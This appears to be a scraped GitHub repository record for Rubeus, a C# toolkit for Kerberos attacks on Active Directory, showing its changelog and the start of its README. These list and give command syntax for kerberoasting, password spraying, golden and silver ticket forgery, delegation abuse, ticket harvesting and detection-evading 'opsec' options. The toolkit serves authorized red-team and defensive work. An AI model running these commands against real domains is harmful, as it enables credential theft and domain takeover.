{
  "metadata": {
    "timestamp": 1736710696813,
    "page": 67,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjcw",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "GhostPack/Rubeus",
      "stars": 4232,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.05859375,
          "content": ".vs\n*.user\n[Dd]ebug/\n[Rr]elease/\n[Bb]in/\n[Oo]bj/\n.DS_Store\n\n"
        },
        {
          "name": "CHANGELOG.md",
          "type": "blob",
          "size": 15.6025390625,
          "content": "# Changelog\nAll notable changes to this project will be documented in this file.\n\nThe format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),\nand this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).\n\n## [3.3.1]\n\n### Fixed\n\n* Unicode characters in domain names\n* Changed till dates within s4u /opsec requests to UTC to work on anything -UTC\n\n## [2.2.1]\n\n### Added\n\n* `/nofullpacsig` switch to the `silver` command to exclude the inclusion of the new FullPacChecksum in service tickets (@0xe7)\n* `/extendedupndns` switch to both `golden` and `silver` to include the extended version of the UpnDsn info buffer (0xe7)\n* automated including proper UPN exists flag (*1* or *0*) within UpnDns info buffer based on LDAP results (0xe7)\n\n### Changed\n\n* default UpnDns Flag from *0* (UPN_SET) to *1* (NO_UPN_SET) in `golden` and `silver` (0xe7)\n\n### Fixed\n\n* typos for `kerberos` usage, changed from `/preauth` to `/nopreauth` (0xe7)\n* parsing of _logoncount_ and _badpwdcount_ from LDAP with exception handling and set to 0 if exception happens (0xe7)\n\n## [2.2.0]\n\n### Added\n\n* `preauthscan` command to scan for accounts that do not require Kerberos pre-authentication\n* `/preauth` argument to the `kerberoast` command, to kerberoast with an account that does not require Kerberos pre-authentication\n* `/nopreauth` flag to the `asktgt` command, to request a TGT without providing pre-authentication\n* `/service` argument to the `asktgt` command, to request service tickets using an AS-REQ\n\n## [2.1.0]\n\n### Added\n\n* `logonsession` command to list information about the current logon session\n\n## [2.0.3]\n\n### Added\n\n* A `/debug` flag that outputs base64 encodings of the inputs to/outputs from the ASN.1 decoding/encoding functions\n* `/createnetonly` parameter to S4U (@tyranid)\n* `/ticket` option to createnetonly to import a ticket into the new process without requiring privileges (@tyranid)\n\n### Fixed\n\n* Handling for KERB_ERRORs\n  \n## [2.0.2]\n\n### Added\n\n* Support for making requests through a KDC proxy using the `/proxyurl:` argument for `asktgt`, `asktgs` and `s4u` (@0xe7)\n\n### Changed\n\n* `KDC_ERR_SVC_UNAVAILABLE` KERBEROS_ERROR, added `KDC_ERR_MUST_USE_USER2USER` and `KDC_ERR_PATH_NOT_ACCEPTED` (@0xe7)\n\n## [2.0.0] - 2021-08-04\n\n### Added\n\n* Full PAC encoding/decoding (@CCob & @0xe7)\n* `golden` and `silver` commands for ticket forging with `/ldap` switch to automate retrieving PAC information (@CCob & @0xe7)\n* `Networking.GetLdapConnection` with LDAPS support using `LdapConnection` (for `kerberoast`/`asreproast`/`golden`/`silver`) (@0xe7)\n* `/getcredentials` for `asktgt` (sends U2U request and automatically extracts NT hash) (@0xe7)\n* `/u2u` for `asktgs` to send User-to-User requests (@0xe7)\n* `/targetuser` for `asktgs` for sending S4U2self requests (@0xe7)\n* `/targetdomain` for `asktgs` for forcing a specific domain for the request (@0xe7)\n* `/targetuser` for `changepw` for changing the password of other users (upgraded `EncKrbPrivPart` to version **-128**) (@CCob)\n* `/servicekey`, `/krbkey` and `/asrepkey` to `describe` for showing PAC and verifying checksums (@CCob & @0xe7)\n* `/serviceuser` and `/servicedomain` to `describe` to create crackable \"hashes\" from **AES** encrypted tickets (@0xe7)\n* `/autoenterprise` now works with the kerberoasting `KerberosRequestorSecurityToken.GetRequest` method (@0xe7)\n* `/ldaps` to `kerberoast` and `asreproast` for querying LDAPS (@0xe7)\n* `/servicekey` to `asktgt` and `asktgs` to decrypt the EncTicketPart (@CCob & @0xe7)\n* `/krbkey` and `/krbenctype` to `asktgs` for verifying the KDCChecksum and TicketChecksum (@0xe7)\n* `/printargs` switch to `asktgs` for printing the arguments required for building a similar PAC with `golden` or `silver` (@0xe7)\n* `Networking.GetGptTmplContent` for parsing domain policy files using when forging tickets (and `/ldap` is used) (@0xe7)\n* `Helpers.GetADObjects` for converting returned LDAP results into a common format (`List<IDictionary<string, Object>>`) (0xe7)\n\n### Fixed\n\n* Complete rewrite of `Networking.SendBytes` (@CCob)\n* Fixed `PA_S4U_X509_USER` pa data section for `s4u /opsec` (@0xe7)\n* Added check after `S4U2self` to throw error if not received, avoids unhandled exception calling `S4U2proxy` without a ticket, on `s4u` command (@0xe7)\n* Handled `KDC_ERR_KEY_EXPIRED` for `brute` command (@0xe7)\n\n### Changed\n\n* Complete rewrite `AuthorizationData` sections (@0xe7)\n* Added `keyUsage`  argument to `Crypto.KerberosChecksum` to create `PA_S4U_X509_USER` checksum (@0xe7)\n* Aliased `brute` to `spray` (@0xe7)\n* Changed `System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName` to `System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name` for `asktgt` when automatically resolving the domain (works in more situations) (@0xe7)\n\n\n## [1.6.3] - 2021-03-26\n\n### Change\n\n* Only final cert in chain used to verify when signing PKINIT requests, /verifycerts flag added for full verification\n\n### Fixed\n\n* Replaced /certificate info for help and README\n\n\n## [1.6.2] - 2021-03-12\n\n### Added\n\n* Adapted/integrated the PR from @RiccardoAncarani for `/delay:MILLISECONDS` and `/jitter:%` (1-100) flags for `kerberoast`\n* Rubeus.yar yara rule from FireEye's red team tool countermeasure repo\n\n### Changed\n\n* arguments can now use `/arg=value` form in addition to `/arg:value`\n\n### Fixed\n\n* few kerberoasting fixes\n\n\n## [1.6.1] - 2020-12-09\n\n### Added\n\n* /autoenterprise flag to automate retrying failed kerberoasting attempts (@0xe7)\n* support for CVE-2020-17049 using the /bronzebit switch (@0xe7)\n* initial support for basic silver tickets, without a PAC (@0xe7)\n\n### Fixed\n\n* Cross domain enterprise principal kerberoasting (@0xe7)\n* Kerberoasting using DC IP and supplying a TGT (@0xe7)\n\n\n## [1.6.0] - 2020-11-06\n\n### Added\n\n* OPSEC\n    * `/opsec` switch to make `asktgt` / `asktgs` / `s4u` build requests more realistic (@0xe7)\n    * Randomized sequence numbers (@0xe7)\n    * Added proper checksums (@0xe7)\n    * Added enc-authorization-data to TGS-REQs (@0xe7)\n    * Don't send AS-REQ when preauth is disabled (@0xe7)\n    * Automation of requesting forwarded TGT when requesting a service ticket for unconstrained systems (@0xe7)\n    * Added PA-DATA PA-PAC-OPTIONS to normal TGS-REQ when using `/opsec` (@0xe7)\n* Start of smartcard/PKINIT support (@CCob)\n    * `/password` support\n* Support for `/spns` option when kerberoasting (@0xe7)\n* Support for NT-Enterprise principals for service ticket requests on both the `asktgs` and `kerberoast` commands (@0xe7)\n* Support for modifying S4U2Self tickets to be able to impersonate any user on the requesting machine (@0xe7)\n* Cross-domain `s4u` / `asktgs` support (@0xe7)\n* `/runfor:X` flag for the `monitor` command (@G0ldenGunSec)\n* IPv6support (@royreinders)\n\n### Changed\n\n* `kerberoast /user:X` now takes multiple comma separated values\n\n### Fixed\n\n* Casing fix for AES key salts\n* Kerberoasting when using TGT to authenticate but not supplying SPNs (@0xe7)\n* GetDCName() issue on non-domain-joined systems\n* Nonced randomized\n* Fixes for issues from non domain machines (@VbScrub)\n* Replaced checks for \"NT Authority\\System\" string with SID comparison\n* /rc4opsec service name fix\n* LDAP paged searching (@cnotin)\n* TGS-REQ AES formatting (@Ion Todd)\n\n\n\n## [1.5.0] - 2020-01-31\n\n### Added\n\n* to any command that outputs base64 ticket blobs\n    * the universal `/nowrap` argument prevents base64 ticket blobs from being display-wrapped\n\n* the **/consoleoutfile** argument to redirect console output to a file, and the public `MainString(\"command\")` function to work over PSRemoting (see end of README.md)\n\n* **brute** action (from @Zer1t0)\n    * Performs password bruteforcing attacks using raw AS-REQs\n\n* to **triage**/**klist**/**dump** actions\n    * More flexible targeting with **/user**/**/LUID**/**/service**/**/server**/\n\n* to the **kerberoast** action\n    * **/pwdsetafter**, **/pwdsetbefore**, and **/resultlimit** arguments for better targeting (from @pkb1s)\n    * **/stats** flag to list statistics of user accounts without actually roasting them\n    * **/ldapfilter** argument for adding custom LDAP filters to the user search query\n    * **/simple** argument for output file formatting but to the console\n\n* to the **asreproast** action\n    * **/ldapfilter** argument for adding custom LDAP filters to the user search query\n\n* to the **asktgt**/**asktgs**/**s4u** actions\n    * option to save .kirbi file to disk (from @audrummer15)\n\n* to the **s4u** action\n    * the cross-domain s4u support (from @0xe7)\n\n* **currentluid** command to display the current logon sesion ID\n\n### Changed\n* LSA.cs got a complete overhaul for reusability and flexibility (thanks for the help @leechristensen !)\n* **kerberoast** action updated to exclude disabled accounts by default\n* **harvest** mode's **/interval** argument is now in seconds, to match **/monitor**\n* **harvest** / **/monitor** modes revamped\n    * now no longer depend on searching the event logs for 4624 events\n    * full set of current TGTs are extracted each monitor round\n\n### Fixed\n\n* Some timestamp converting code in the ticket extraction section\n* KERB_RETRIEVE_TKT_REQUEST fix for x32 systems (from @0xRCA)\n* Fixed AES salt generation (from @monoxgas)\n* Fixed accidental ticket request behavior when dumping from LsaCallAuthenticationPackage\n* Fixed `renew` command invocation\n* Fixed `asreproast` LDAP querying (broke at some point)\n\n\n## [1.4.2] - 2019-03-01\n\n### Added\n\n* **tgssub** action\n    * Substitutes in alternate sname (cifs) or SPN (ldap/computer.domain.com) into an existing service ticket\n\n\n## [1.4.1] - 2019-02-25\n\n### Added\n* to **asktgs** action\n    * /enctype:[RC4/AES128/AES256/DES] now forces that particular encryption type in the TGS-REQ\n\n### Changed\n* **asktgt** action\n    * Returned tickets now run through the **describe** command\n* **describe** action\n    * Kerberoast hash now only extracted from RC4_HMAC tickets\n\n\n## [1.4.0] - 2019-02-16\n\n### Added\n* **hash** action\n    * hashes a given password to rc4_hmac form, and if /user and /domain supplied, calculates aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 forms \n\n### Changed\n* **kerberoast** action\n    * Fixed query that checks that rc4_hmac is flipped in msds-supportedencryption types, because \"lol Microsoft\"\n* **asktgt** action\n    * /aes128 and /aes now supported for **/enctype** when used with **/password**\n* **crypto** \n    * Replaced @qlemaire's PR of Kevin-Robertson' Get-KerberosAESKey hash code with @gentilkiwi's KERB_ECRYPT HashPassword approach\n* **README**\n    * added @elad_shamir into the references\n\n\n## [1.3.6] - 2019-02-14\n\n### Added\n* **kerberoast** action\n    * /rc4opsec option to use **tgtdeleg** and filter out AES-enabled accounts\n    * /aes option to AES roast only AES-enabled accounts\n\n### Changed\n* **kerberoast** action\n    * Default user query searches for accounts with RC4 enabled\n    * Default behavior when using the /tgtdeleg flag requests RC4 for ALL accounts (including AES)\n    * Display \"Supported ETypes\" in enumerated output\n* **tgtdeleg** action\n    * Changed the default requested SPN from HOST/dc.domain.com to cifs/dc.domain.com\n\n### Fixed\n* Kerberoast hash display for some option combinations\n\n\n## [1.3.5] - 2019-02-13\n\n### Changed\n* **kerberoast** action\n    * now has /ticket option to use an existing TGT for Kerberoasting\n    * now has /usetgtdeleg option to use **tgtdeleg** option as the TGT for Kerberoasting\n    * LDAP user search path and number of found users now output\n* **describe** action\n    * Kerberoast hash output now generated for service tickets\n\n### Fixed\n* Kerberoast hash display but when /spn and /outfile were specified\n* Kerberoast samaccountname now properly put into hash output\n\n\n## [1.3.4] - 2019-02-12\n\n### Changed\n* **kerberoast** action now has /domain and /dc like **asreproast** action\n* **kerberoast** and **asreproast** now properly work over domain trusts\n* **triage** command now works for the current non-elevated user, outputting current LUID as well\n* Current LUID output also added for non-elevated **dump** and **klist** commands\n* Added Opsec section in README.md\n\n\n## [1.3.3] - 2019-02-11\n### Changed\n* Landed @leechristensen's cleanup of the Monitor4624 code\n* Restructed the README.md to match the help output, updated all examples, added table of contents\n\n\n## [1.3.3] - 2019-02-07\n### Added\n* **triage** action\n    * Quickly triages the users and present tickets on a machine\n\n### Changed\n* **dump** and **klist** changed default LUID output to hex format\n\n\n## [1.3.2] - 2019-02-06\n### Added\n* **kerberoast** and **asreproast** actions\n    * Added /outfile:X to output hashes to a file, one hash per line\n\n### Changed\n* **asreproast** changed asreproast's default behavior to match **kerberoast**\n* Clustered the default output help menu around function (things were getting crowded)\n\n\n## [1.3.1] - 2019-02-06\n### Fixed\n* Changed underlying LUID logic to handle UInt64s\n\n\n## [1.3.0] - 2019-02-05\n### Added\n* **klist** action\n    * lists current user's (or if elevated, all users') ticket information\n\n### Changed\n* **s4u** landed @eladshamir's pull requests\n    * RBCD support\n    * support loading TGS from Kirbi to skip S4U2Self and perform S4U2Proxy only\n    * perform S4U2Self only\n    * print output for each stage\n* **asreproast** landed @rvrsh3ll's pull request\n    * added hashcat output format\n* **asktgt** landed @qlemaire's pull request\n    * now accepts a /password:X parameter\n* **monitor** and **harvest** landed @djhohnstein's pull request\n    * ticket extraction can now be saved to the registry with the \"/registry:X\" flag\n\n### Fixed\n* **dump** display of service tickets with multiple slashes\n* response buffer size in lib/Networking.cs increased for large ticket responses\n* landed @BlueSkeye's fixes for PTT bug fix, TicketFlags display, and dead code removal in PA_DATA.Encode\n\n\n## [1.2.1] - 2018-10-09\n### Changed\n* Merged @mark-s' PR that broke out Program.cs' commands into 'Command' classes for easier command addition.\n* Commands that pass /dc:X are now passed through Networking.GetDCIP(), which resolves the DC name (if null) and returns the DC IP. Code refactored to use this centralized resolver.\n* The /user:USER flag can now be /user:DOMAIN.COM\\USER (auto-completes /domain:Y).\n* The **harvest** command now returns the user ticket with the latest renew_till time on intial extraction.\n\n\n## [1.2.0] - 2018-10-03\n### Added\n* **changepw** action\n    * implements the AoratoPw user password reset from a TGT .kirbi\n    * equivalent to Kekeo's misc::changepw function\n\n\n## [1.1.0] - 2018-09-31\n### Added\n* **asktgs** action - takes /ptt:X, /dc:X, /ticket:X flags like asktgt, /service:X takes one or more SPN specifications\n* **tgtdeleg** action - reimplements @gentilkiwi's Kekeo tgt::deleg function\n    * uses the GSS-API Kerberos specification (RFC 4121) to request a \"fake\" delegation context that stores a KRB-CRED in the Authenticator Checksum. Combined with extracting the service session key from the local cache, this allows us to recover usable TGTs for the current user without elevation.\n* Added CHANGELOG.md\n\n### Changed\n* **s4u** action now accepts multiple alternate snames (/altservice:X,Y,...)\n    * This executes the S4U2self/S4U2proxy process only once, and substitutes the multiple alternate service names\n        into the final resulting service ticket structure(s) for as many snames as specified\n* **asreproast** action\n    * added eventual hashcat output format, use \"/format:<john/hashcat>\" (default of \"john\")\n\n### Fixed\n* **dump** action now correctly extracts ServiceName/TargetName strings\n* **asreproast** action - fixed salt demarcation line for \"asreproast\" hashes\n* **kerberoast** action\n    * Added reference for @machsosec for the KerberosRequestorSecurityToken.GetRequest Kerberoasting Method()\n    * Corrected encType extraction for the hash output\n\n\n## [1.0.0] - 2018-08-24\n\n* Initial release\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.54296875,
          "content": "Rubeus is provided under the 3-clause BSD license below.\r\n\r\n*************************************************************\r\n\r\nCopyright (c) 2018, Will Schroeder\r\nAll rights reserved.\r\n\r\nRedistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:\r\n\r\n    Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.\r\n    Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.\r\n    The names of its contributors may not be used to endorse or promote products derived from this software without specific prior written permission.\r\n\r\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\r\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 208.8359375,
          "content": "# Rubeus\r\n\r\n----\r\n\r\nRubeus is a C# toolset for raw Kerberos interaction and abuses. It is **heavily** adapted from [Benjamin Delpy](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) project (CC BY-NC-SA 4.0 license) and [Vincent LE TOUX](https://twitter.com/mysmartlogon)'s [MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin) project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.\r\n\r\n[Charlie Clark](https://twitter.com/exploitph) and [Ceri Coburn](https://twitter.com/_EthicalChaos_) have both made _significant_ contributions as co-developers to the Rubeus codebase. [Elad Shamir](https://twitter.com/elad_shamir) contributed some essential work for resource-based constrained delegation. Their work is very appreciated!\r\n\r\nRubeus also uses a C# ASN.1 parsing/encoding library from [Thomas Pornin](https://github.com/pornin) named [DDer](https://github.com/pornin/DDer) that was released with an \"MIT-like\" license. Huge thanks to Thomas for his clean and stable code!\r\n\r\nPKINIT code heavily adapted from [@SteveSyfuhs](https://twitter.com/SteveSyfuhs)'s [Bruce](https://github.com/dotnet/Kerberos.NET) tool. Bruce made RFC4556 (PKINIT) a lot easier to understand. Huge thanks to Steve!\r\n\r\nNDR encoding and decoding for Kerberos PAC is based on the [NtApiDotNet](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/master/NtApiDotNet) library from [@tiraniddo](https://twitter.com/tiraniddo), thank you James.\r\n\r\nThe [KerberosRequestorSecurityToken.GetRequest](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method for Kerberoasting was contributed to PowerView (and then incorporated into Rubeus) by [@machosec](https://twitter.com/machosec).\r\n\r\n[@harmj0y](https://twitter.com/harmj0y) is the primary author of this code base.\r\n\r\nRubeus is licensed under the BSD 3-Clause license.\r\n\r\n## Table of Contents\r\n\r\n- [Rubeus](#rubeus)\r\n  - [Table of Contents](#table-of-contents)\r\n  - [Background](#background)\r\n    - [Command Line Usage](#command-line-usage)\r\n    - [Opsec Notes](#opsec-notes)\r\n      - [Overview](#overview)\r\n      - [Weaponization](#weaponization)\r\n      - [Example: Credential Extraction](#example-credential-extraction)\r\n      - [Example: Over-pass-the-hash](#example-over-pass-the-hash)\r\n  - [Ticket requests and renewals](#ticket-requests-and-renewals)\r\n    - [asktgt](#asktgt)\r\n    - [asktgs](#asktgs)\r\n    - [renew](#renew)\r\n    - [brute](#brute)|spray\r\n  - [Constrained delegation abuse](#constrained-delegation-abuse)\r\n    - [s4u](#s4u)\r\n  - [Ticket Forgery](#ticket-forgery)\r\n    - [golden](#golden)\r\n    - [silver](#silver)\r\n    - [diamond](#diamond)\r\n  - [Ticket Management](#ticket-management)\r\n    - [ptt](#ptt)\r\n    - [purge](#purge)\r\n    - [describe](#describe)\r\n  - [Ticket Extraction and Harvesting](#ticket-extraction-and-harvesting)\r\n    - [triage](#triage)\r\n    - [klist](#klist)\r\n    - [dump](#dump)\r\n    - [tgtdeleg](#tgtdeleg)\r\n    - [monitor](#monitor)\r\n    - [harvest](#harvest)\r\n  - [Roasting](#roasting)\r\n    - [kerberoast](#kerberoast)\r\n      - [kerberoasting opsec](#kerberoasting-opsec)\r\n      - [Examples](#examples)\r\n    - [asreproast](#asreproast)\r\n  - [Miscellaneous](#miscellaneous)\r\n    - [createnetonly](#createnetonly)\r\n    - [changepw](#changepw)\r\n    - [hash](#hash)\r\n    - [tgssub](#tgssub)\r\n    - [currentluid](#currentluid)\r\n    - [logonsession](#logonsession)\r\n    - [asrep2kirbi](#asrep2kirbi)\r\n    - [kirbi](#kirbi)\r\n  - [Compile Instructions](#compile-instructions)\r\n    - [Targeting other .NET versions](#targeting-other-net-versions)\r\n    - [Sidenote: Building Rubeus as a Library](#sidenote-building-rubeus-as-a-library)\r\n    - [Sidenote: Running Rubeus Through PowerShell](#sidenote-running-rubeus-through-powershell)\r\n      - [Sidenote Sidenote: Running Rubeus Over PSRemoting](#sidenote-sidenote-running-rubeus-over-psremoting)\r\n\r\n## Background\r\n\r\n### Command Line Usage\r\n\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.3.1\r\n\r\n\r\n     Ticket requests and renewals:\r\n\r\n        Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:\r\n            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]\r\n\r\n        Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:\r\n            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]\r\n    \r\n        Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:\r\n            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\\Windows\\System32\\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]\r\n\r\n        Retrieve a TGT using a PCKS12 certificate, start a /netonly process, and to apply the ticket to the new process/logon session:\r\n            Rubeus.exe asktgt /user:USER /certificate:C:\\temp\\leaked.pfx </password:STOREPASSWORD> /createnetonly:C:\\Windows\\System32\\cmd.exe [/getcredentials] [/servicekey:KRBTGTKEY] [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]\r\n\r\n        Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new process/logon session:\r\n            Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\\Windows\\System32\\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/suppenctype:DES|RC4|AES128|AES256] [/nowrap]\r\n\r\n        Retrieve a TGT suitable for changing an account with an expired password using the changepw command\r\n            Rubeus.exe asktgt /user:USER </password:PASSWORD /changepw [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/proxyurl:https://KDC_PROXY/kdcproxy]\r\n\r\n        Request a TGT without sending pre-auth data:\r\n            Rubeus.exe asktgt /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]\r\n\r\n        Request a service ticket using an AS-REQ:\r\n            Rubeus.exe asktgt /user:USER /service:SPN </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]\r\n\r\n       Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:\r\n            Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]\r\n\r\n        Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:\r\n            Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]\r\n\r\n        Perform a Kerberos-based password bruteforcing attack:\r\n            Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]\r\n\r\n        Perform a scan for account that do not require pre-authentication:\r\n            Rubeus.exe preauthscan /users:C:\\temp\\users.txt [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/proxyurl:https://KDC_PROXY/kdcproxy]\r\n\r\n\r\n     Constrained delegation abuse:\r\n\r\n        Perform S4U constrained delegation abuse:\r\n            Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/proxyurl:https://KDC_PROXY/kdcproxy] [/createnetonly:C:\\Windows\\System32\\cmd.exe] [/show]\r\n            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/createnetonly:C:\\Windows\\System32\\cmd.exe] [/show]\r\n\r\n        Perform S4U constrained delegation abuse across domains:\r\n            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self] [/nopac] [/createnetonly:C:\\Windows\\System32\\cmd.exe] [/show]\r\n\r\n\r\n     Ticket Forgery:\r\n\r\n        Forge a golden ticket using LDAP to gather the relevent information:\r\n            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/printcmd] [outfile:FILENAME] [/ptt]\r\n\r\n        Forge a golden ticket using LDAP to gather the relevent information but explicitly overriding some values:\r\n            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] 